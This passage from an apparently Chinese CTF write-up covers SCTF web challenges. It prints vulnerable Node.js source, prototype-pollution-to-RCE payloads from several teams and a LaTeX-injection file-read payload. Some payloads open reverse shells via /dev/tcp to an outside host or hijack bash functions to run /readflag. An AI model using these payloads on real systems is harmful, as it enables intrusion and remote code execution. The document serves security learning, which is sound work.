  &#125;);<br>    key.<span class="hljs-title function_">setOptions</span>(&#123; <span class="hljs-attr">environment</span>: <span class="hljs-string">&quot;browser&quot;</span> &#125;);<br>    <span class="hljs-keyword">return</span> key.<span class="hljs-title function_">decrypt</span>(body, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;decrypt error&quot;</span>, e);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>&#125;;<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> encryptedPassword = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br>  <span class="hljs-keyword">const</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br><br>  <span class="hljs-keyword">try</span> &#123;<br>    passwd = <span class="hljs-title function_">decrypt</span>(encryptedPassword)<br>    <span class="hljs-keyword">if</span>(username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>      <span class="hljs-keyword">const</span> sql = <span class="hljs-string">`select (select password from user where username = &#x27;admin&#x27;) = &#x27;<span class="hljs-subst">$&#123;passwd&#125;</span>&#x27;;`</span><br>      con.<span class="hljs-title function_">query</span>(sql, <span class="hljs-function">(<span class="hljs-params">err, rows</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(err.<span class="hljs-property">message</span>);<br>        <span class="hljs-keyword">if</span> (rows[<span class="hljs-number">0</span>][<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(rows[<span class="hljs-number">0</span>])]) &#123;<br>          <span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123;username, <span class="hljs-attr">role</span>: username&#125;, <span class="hljs-variable constant_">SECRET_KEY</span>, &#123;<span class="hljs-attr">expiresIn</span>: <span class="hljs-string">&#x27;1h&#x27;</span>&#125;);<br>          res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;auth_token&#x27;</span>, token, &#123;<span class="hljs-attr">secure</span>: <span class="hljs-literal">false</span>&#125;);<br>          res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Login Successfully&#x27;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Errow Password!&#x27;</span>&#125;);<br>        &#125;<br>      &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;This Website Only Open for admin&#x27;</span>&#125;);<br>    &#125;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Error decrypting password!&#x27;</span> &#125;);<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/ExP0rtApi&#x27;</span>, verifyAdmin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> rootpath = req.<span class="hljs-property">query</span>.<span class="hljs-property">v</span>;<br>  <span class="hljs-keyword">var</span> file = req.<span class="hljs-property">query</span>.<span class="hljs-property">f</span>;<br><br>  file = file.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\.\.\//g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>  rootpath = rootpath.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\.\.\//g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>  <span class="hljs-keyword">if</span>(rootpath === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(file === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;try to find parameters HaHa&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      rootpath = <span class="hljs-string">&quot;static&quot;</span><br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> filePath = path.<span class="hljs-title function_">join</span>(__dirname, rootpath + <span class="hljs-string">&quot;/&quot;</span> + file);<br><br>  <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(filePath)) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;File not found&#x27;</span>);<br>  &#125;<br>  fs.<span class="hljs-title function_">readFile</span>(filePath, <span class="hljs-function">(<span class="hljs-params">err, fileData</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error reading file:&#x27;</span>, err);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error reading file&#x27;</span>);<br>    &#125;<br><br>    zlib.<span class="hljs-title function_">gzip</span>(fileData, <span class="hljs-function">(<span class="hljs-params">err, compressedData</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (err) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error compressing file:&#x27;</span>, err);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error compressing file&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">const</span> base64Data = compressedData.<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>);<br>      res.<span class="hljs-title function_">send</span>(base64Data);<br>    &#125;);<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/report&quot;</span>, verifyAdmin ,<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&quot;/static/report_noway_dirsearch.html&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/report&quot;</span>, verifyAdmin ,<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123;user, date, reportmessage&#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title class_">Reportcache</span>[user] === <span class="hljs-literal">undefined</span>) &#123;<br>    <span class="hljs-title class_">Reportcache</span>[user] = &#123;&#125;;<br>  &#125;<br>  <span class="hljs-title class_">Reportcache</span>[user][date] = reportmessage<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Report Success&#x27;);window.location.href=&#x27;/report&#x27;&lt;/script&gt;&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/countreport&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> user <span class="hljs-keyword">in</span> <span class="hljs-title class_">Reportcache</span>) &#123;<br>    count += <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-title class_">Reportcache</span>[user]).<span class="hljs-property">length</span>;<br>  &#125;<br>  res.<span class="hljs-title function_">json</span>(&#123; count &#125;);<br>&#125;);<br><br><span class="hljs-comment">//查看当前运行用户</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/VanZY_s_T3st&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> command = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>  <span class="hljs-keyword">const</span> cmd = cp.<span class="hljs-title function_">spawn</span>(command ,[]);<br>  cmd.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">end</span>(data.<span class="hljs-title function_">toString</span>());<br>  &#125;);<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>刚开始猜测是打原型链污染child_progress，但是读到这个Node最新版本算是，没辙。</p>
+<p>本地起一个这个玩意还报错了handle找不到，猜测他还有handle里的东西，结果真有：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// /app/handle/index.js</span><br><br><span class="hljs-keyword">var</span> ritm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;require-in-the-middle&#x27;</span>);<br><span class="hljs-keyword">var</span> patchChildProcess = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./child_process&#x27;</span>);<br><br><span class="hljs-keyword">new</span> ritm.<span class="hljs-title class_">Hook</span>(<br>    [<span class="hljs-string">&#x27;child_process&#x27;</span>],<br>    <span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable language_">module</span>, name</span>) &#123;<br>        <span class="hljs-keyword">switch</span> (name) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;child_process&#x27;</span>: &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_">patchChildProcess</span>(<span class="hljs-variable language_">module</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// /app/handle/child_process.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">patchChildProcess</span>(<span class="hljs-params">cp</span>) &#123;<br><br>    cp.<span class="hljs-property">execFile</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">execFile</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br>    cp.<span class="hljs-property">fork</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">fork</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br>    cp.<span class="hljs-property">spawn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">spawn</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br>    cp.<span class="hljs-property">execFileSync</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">execFileSync</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br>    cp.<span class="hljs-property">execSync</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">execSync</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>() &#125;);<br>    cp.<span class="hljs-property">spawnSync</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">spawnSync</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br><br>    <span class="hljs-keyword">return</span> cp;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">patchOptions</span>(<span class="hljs-params">hasArgs</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">apply</span>(<span class="hljs-params">target, thisArg, args</span>) &#123;<br>        <span class="hljs-keyword">var</span> pos = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (pos === args.<span class="hljs-property">length</span>) &#123;<br>            args[pos] = <span class="hljs-title function_">prototypelessSpawnOpts</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pos &lt; args.<span class="hljs-property">length</span>) &#123;<br>            <span class="hljs-keyword">if</span> (hasArgs &amp;&amp; (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(args[pos]) || args[pos] == <span class="hljs-literal">null</span>)) &#123;<br>                pos++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> args[pos] === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; args[pos] !== <span class="hljs-literal">null</span>) &#123;<br>                args[pos] = <span class="hljs-title function_">prototypelessSpawnOpts</span>(args[pos]);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (args[pos] == <span class="hljs-literal">null</span>) &#123;<br>                args[pos] = <span class="hljs-title function_">prototypelessSpawnOpts</span>();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> args[pos] === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>                args.<span class="hljs-title function_">splice</span>(pos, <span class="hljs-number">0</span>, <span class="hljs-title function_">prototypelessSpawnOpts</span>());<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> target.<span class="hljs-title function_">apply</span>(thisArg, args);<br>    &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">prototypelessSpawnOpts</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">var</span> prototypelessObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>), obj);<br>    prototypelessObj.<span class="hljs-property">env</span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>), prototypelessObj.<span class="hljs-property">env</span> || process.<span class="hljs-property">env</span>);<br>    <span class="hljs-keyword">return</span> prototypelessObj;<br>&#125;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = patchChildProcess;<br></code></pre></td></tr></table></figure>
+
+<p>用的环境变量劫持，pp2rce，直接修改shell变量，由于它本地有个&#x2F;readflag所以能直接读了。又学到了啊：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p>
+<p>学长这么打的：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;__proto__&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;date&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2&quot;</span><span class="hljs-punctuation">,</span> <br>    <span class="hljs-attr">&quot;reportmessage&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;shell&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/bin/bash&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;argv0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/bin/bash&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;env&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>	<span class="hljs-attr">&quot;BASH_FUNC_whoami%%&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;() &#123; /readflag &gt; /tmp/123; &#125;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>cookies=<span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;auth_token&quot;</span><span class="hljs-punctuation">:</span>admin_cookie<br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>星盟：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;__proto__&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;date&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;reportmessage&quot;</span><span class="hljs-punctuation">:</span> <br>    <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;shell&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/readflag&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;env&quot;</span><span class="hljs-punctuation">:</span> <br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;NODE_DEBUG&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;require(\&quot;child_process\&quot;).exec(\&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;\&quot;);process.exit()//&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;NODE_OPTIONS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;--require /proc/self/environ&quot;</span><br><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>W&amp;M:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_report</span>(<span class="hljs-params">username,date,report</span>):<br>    resp = rs.post(remote_addr+<span class="hljs-string">&quot;/report&quot;</span>,json=&#123;<span class="hljs-string">&quot;user&quot;</span>:username,<span class="hljs-string">&quot;date&quot;</span>:date,<span class="hljs-string">&quot;reportmessage&quot;</span>:report&#125;)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-string">&#x27;Report Success&#x27;</span> <span class="hljs-keyword">in</span> resp.text<br><br>add_report(<span class="hljs-string">&quot;__proto__&quot;</span>,<span class="hljs-number">2</span>,&#123;<span class="hljs-string">&quot;shell&quot;</span>:<span class="hljs-string">&quot;/proc/self/exe&quot;</span>,<span class="hljs-string">&quot;argv0&quot;</span>:<span class="hljs-string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;/bin/sh -i &gt;&amp; /dev/tcp/123.45.6.7/9999 0&gt;&amp;1\&quot;&#x27;).toString())//&quot;</span>,<span class="hljs-string">&quot;env&quot;</span>:&#123;<span class="hljs-string">&quot;NODE_OPTIONS&quot;</span>:<span class="hljs-string">&quot;--require /proc/self/cmdline&quot;</span>&#125;&#125;)<br></code></pre></td></tr></table></figure>
+
+<h2 id="ez-tex"><a href="#ez-tex" class="headerlink" title="ez_tex"></a>ez_tex</h2><p>没打出来，有点遗憾。W&amp;M还是太猛了。</p>
+<p>LaTex Injection绕所有黑名单：</p>
+<p>[PayloadsAllTheThings&#x2F;LaTeX Injection&#x2F;README.md at master · swisskyrepo&#x2F;PayloadsAllTheThings (github.com)](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX</a> Injection&#x2F;README.md)</p>
+<p><img src="/2024/10/05/sctf-web-learning/image-20241006000009619.png" srcset="/img/loading.gif" lazyload alt="image-20241006000009619"></p>
+<p>提示&#x2F;log，有个app.log不知道咋用。想想怎么带出数据。</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-keyword">\documentclass</span>[]&#123;article&#125;<br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><br><span class="hljs-keyword">\newread</span><span class="hljs-keyword">\infile</span><br><span class="hljs-keyword">\openin</span><span class="hljs-keyword">\infile</span>=main.py<br><span class="hljs-keyword">\imm</span>^^65diate<span class="hljs-keyword">\newwrite</span><span class="hljs-keyword">\outfile</span><br><span class="hljs-keyword">\imm</span>^^65diate<span class="hljs-keyword">\openout</span><span class="hljs-keyword">\outfile</span>=a^^70p.l^^6fg<br><span class="hljs-keyword">\loop</span><span class="hljs-keyword">\unless</span><span class="hljs-keyword">\ifeof</span><span class="hljs-keyword">\infile</span><br>    <span class="hljs-keyword">\imm</span>^^65diate<span class="hljs-keyword">\read</span><span class="hljs-keyword">\infile</span> to<span class="hljs-keyword">\line</span><br>    <span class="hljs-keyword">\imm</span>^^65diate<span class="hljs-keyword">\write</span><span class="hljs-keyword">\outfile</span>&#123;<span class="hljs-keyword">\line</span>&#125;<br><span class="hljs-keyword">\repeat</span><br><span class="hljs-keyword">\closeout</span><span class="hljs-keyword">\outfile</span><br><span class="hljs-keyword">\closein</span><span class="hljs-keyword">\infile</span><br><span class="hljs-keyword">\newpage</span><br>foo<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure>
+
+<p>读到main.py：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os <br><span class="hljs-keyword">import</span> logging <br><span class="hljs-keyword">import</span> subprocess <br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, redirect <br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename <br><br>app = Flask(__name__) <br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> app.debug: <br>        handler = logging.FileHandler(<span class="hljs-string">&#x27;app.log&#x27;</span>) <br>        handler.setLevel(logging.INFO) <br>        app.logger.addHandler(handler) <br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads&#x27;</span> <br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER <br><br>os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="hljs-literal">True</span>) <br><br>ALLOWED_EXTENSIONS = &#123;<span class="hljs-string">&#x27;txt&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;tex&#x27;</span>&#125; <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>): <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">and</span> \ <br>        filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() <span class="hljs-keyword">in</span> ALLOWED_EXTENSIONS <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compile_tex</span>(<span class="hljs-params">file_path</span>): <br>        output_filename = file_path.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.pdf&#x27;</span> <br>        <span class="hljs-keyword">try</span>: <br>       